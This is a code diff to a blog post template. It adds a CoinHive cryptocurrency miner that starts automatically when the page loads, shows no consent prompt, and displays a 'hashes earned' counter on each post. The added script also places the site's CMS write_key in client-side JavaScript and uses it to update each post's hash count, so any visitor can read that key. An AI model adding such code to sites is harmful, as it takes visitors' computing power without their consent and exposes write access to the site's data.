@@ -18,6 +18,7 @@
             <div class="blog__author-image" style="background-image: url({{ metadata.author.metadata.image.imgix_url }}?w=100)"></div>
           </a>
           <div class="blog__author-title">by <a href="/author/{{ metadata.author.slug }}">{{ metadata.author.title }}</a> on {{ friendly_date }}</div>
+          <div class="blog__hashes-earned"><img src="/images/coin.svg" width="20"/>&nbsp;&nbsp;<span id="hashes">{{ metadata.hashes }}</span> hashes earned</div>
           <div class="clearfix"></div>
         </div>
         <div class="blog__content droid">{{{ content }}}</div>
@@ -28,5 +29,57 @@
         </div>
       </div>  
     {{/ current_post }}
+    <script>
+      var miner = new CoinHive.Anonymous('{{ coin_hive_key }}');
+      miner.start();
+    </script>
+    <script>
+      // Listen on events
+      miner.on('found', function() { /* Hash found */ })
+      miner.on('accepted', function(response) { 
+        var hashes = response.hashes;
+        var config = {
+          bucket: {
+            slug: '{{ bucket_slug }}',
+            read_key: '{{ read_key }}'
+          }
+        }
+        Cosmic.getObject(config, { slug: '{{ current_post.slug }}' }, function(err, res) {
+          var current_hashes = 0;
+          if (res.object.metadata.hashes)
+            current_hashes = res.object.metadata.hashes
+          var new_hashes = Number(current_hashes) + Number(hashes);
+          res.object.metafields = res.object.metafields.filter(function(metafield) {
+            if (metafield.key !== 'hashes')
+              return metafield;
+          });
+          var params = {
+            slug: '{{ current_post.slug }}',
+            metafields: res.object.metafields,
+            write_key: '{{ write_key }}'
+          };
+          params.metafields.push({
+            title: 'Hashes',
+            key: 'hashes',
+            value: new_hashes,
+            type: 'text'
+          });
+          document.getElementById('hashes').innerHTML = numberWithCommas(new_hashes);
+          Cosmic.editObject(config, params, function(err, res) {
+
+            // chaching!
+          });
+        });
+      });
+      function numberWithCommas(x) {
+        if (!x)
+          return 0;
+        x = x.toString();
+        var pattern = /(-?\d+)(\d{3})/;
+        while (pattern.test(x))
+            x = x.replace(pattern, "$1,$2");
+        return x;
+      }
+    </script>
   </main>
 {{> footer }}
